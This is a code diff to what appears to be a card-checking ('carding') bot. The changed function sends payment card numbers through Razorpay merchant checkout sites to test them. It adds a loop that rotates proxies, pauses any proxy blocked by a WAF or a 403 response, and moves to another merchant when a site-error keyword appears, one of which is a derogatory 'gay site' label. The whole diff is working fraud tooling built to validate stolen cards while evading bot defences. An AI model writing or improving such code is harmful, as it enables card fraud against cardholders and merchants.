@@ -396,21 +396,41 @@ async def process_rz_check(message, proc_msg, user, user_id, formatted_cc, cc, p
         # ═══════════════════════════════════════════════════════
         # NON-INDIA CARD - Proceed with actual gate check
         # ═══════════════════════════════════════════════════════
-        # Proxy from rz_pxy.txt via shared rotation (403-free: 1 in-flight, 5 uses -> pause)
-        _proxy, _plock = rz_rotation.acquire_proxy()
-        if not _proxy:
-            api_result = {"status": "error", "response": "No proxies in rz_pxy.txt."}
-        else:
+        # Site-level failures ("Site Change", server error, etc.) cool the site
+        # and the SAME card is re-checked on the next site — never shown raw.
+        _site_error_kw = (
+            "site change", "server error", "site issue", "something went wrong",
+            "should not be sent", "extra field", "order failed", "merchant blocked",
+            "merchant not activated", "payment page inactive", "site unavailable",
+            "no stock", "out of stock", "amount too small", "min purchase",
+            "gay site", "mandatory item", "invalid email", "currency is invalid",
+        )
+        cur_site = site
+        api_result = {"status": "error", "response": "Unknown Error"}
+        for _attempt in range(12):
+            if not cur_site:
+                cur_site = rz_rotation.next_site() or ""
+            _proxy, _plock = rz_rotation.acquire_proxy()
+            if not _proxy:
+                api_result = {"status": "error", "response": "No proxies in rz_pxy.txt."}
+                break
             try:
-                api_result = await asyncio.to_thread(_rz_api_check, formatted_cc, _proxy, site, amount_paise)
+                api_result = await asyncio.to_thread(_rz_api_check, formatted_cc, _proxy, cur_site, amount_paise)
             finally:
                 rz_rotation.release_proxy(_proxy, _plock)
                 rz_rotation.record_proxy_use(_proxy)
-            if site:
-                rz_rotation.record_site_result(site, api_result.get("response", ""))
             _resp_low = str(api_result.get("response", "")).lower()
+            if cur_site:
+                rz_rotation.record_site_result(cur_site, _resp_low)
             if "403" in _resp_low or "forbidden" in _resp_low or "waf" in _resp_low:
                 rz_rotation.pause_proxy_403(_proxy)
+            if any(k in _resp_low for k in _site_error_kw):
+                cur_site = rz_rotation.next_site()
+                if not cur_site:
+                    await asyncio.sleep(60)
+                    cur_site = rz_rotation.next_site() or ""
+                continue
+            break
         status_raw = api_result.get("status", "").lower()
         res_message = api_result.get("response", "N/A")
     actual_inr = int(api_result.get("amount_inr") or (amount_paise // 100))
